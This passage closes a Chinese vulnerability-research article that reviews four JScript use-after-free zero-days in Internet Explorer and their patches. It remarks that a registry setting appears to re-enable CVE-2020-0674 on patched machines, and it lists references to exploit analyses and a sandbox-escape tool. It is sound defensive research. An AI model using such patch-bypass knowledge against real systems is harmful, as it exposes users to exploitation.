笔者在打了 CVE-2020-0674 补丁的机器上新建了上述注册表项和键，并设为 1，发现 CVE-2020-0674 的补丁不再起作用，由此推测该注册表可能是为了兼容性问题所设。

写在最后
----

本文中笔者回顾了近两年出现的 4 个 jscript 零日漏洞，借助 PoC 解释了这些漏洞的成因，分析了其中一个漏洞的在野利用方式，并对相关修补方案做了简要分析。随着 CVE-2020-0674 的补丁方案的引入，此类 Jscript UAF 基本宣告落幕。这几个案例清楚地告诉我们：对漏洞修复工作者来说，如果对一类通用漏洞中的某个 Case 采用创可贴式的修复，不深挖根源，就会导致本文中这样连续绕过的故事，最后于时间和精力上都是巨大的开销。

参考链接
----

*   CVE-2018-8353  
    https://bbs.pediy.com/thread-257127.htm  
    https://bugs.chromium.org/p/project-zero/issues/detail?id=1587
*   CVE-2018-8653  
    https://blog.tetrane.com/Analysis_of_CVE_2018_8653_Memory_Management.html  
    https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ie-scripting-flaw-still-a-threat-to-unpatched-systems-analyzing-cve-2018-8653/
*   CVE-2019-1367  
    https://googleprojectzero.blogspot.com/p/rca-cve-2019-1367.html  
    https://blog.confiant.com/internet-explorer-cve-2019-1367-exploitation-part-1-7ff08b7dcc8b  
    https://blog.confiant.com/internet-explorer-cve-2019-1367-exploitation-part-2-8143242b5780
*   CVE-2019-1429  
    https://bugs.chromium.org/p/project-zero/issues/detail?id=1947
*   CVE-2019-0674  
    https://bbs.pediy.com/thread-259500.htm  
    https://www.anquanke.com/post/id/214254  
    https://googleprojectzero.blogspot.com/p/rca-cve-2020-0674.html  
    https://labs.f-secure.com/blog/internet-exploiter-understanding-vulnerabilities-in-internet-explorer
*   补丁分析  
    https://www.venustech.com.cn/article/1/11420.html  
    https://twitter.com/0patch/status/1039135774330036235  
    https://twitter.com/ifsecure/status/1034419566825361408  
    https://twitter.com/ifsecure/status/1083679895534927872
*   Jscript 的垃圾回收机制  
    https://gist.github.com/sudhackar/20eef22e8790ee05a3b325513daf858b  
    https://docs.microsoft.com/zh-cn/archive/blogs/ericlippert/how-do-the-script-garbage-collectors-work
*   借助 WPAD 绕过沙箱  
    https://github.com/hacksysteam/WpadEscape  
    https://googleprojectzero.blogspot.com/2017/12/apacolypse-now-exploiting-windows-10-in_18.html
*   Paper from Google Project Zero & Threat Analysis Group  
    https://github.com/maddiestone/ConPresentations/blob/master/BluehatIL2020.VariantAnalysis.pdf  
    https://github.com/maddiestone/ConPresentations/blob/master/BH2020.ReversingTheRoot.pdf  
    https://www.sstic.org/media/SSTIC2020/SSTIC-actes/cloture_2020/SSTIC2020-Slides-cloture_2020-lecigne.pdf

[看雪学院推出的专业资质证书《看雪安卓应用安全能力认证 v1.0》（中级和高级）！](https://bbs.pediy.com/thread-265424.htm)

最后于 2020-8-22 14:58 被银雁冰编辑 ，原因：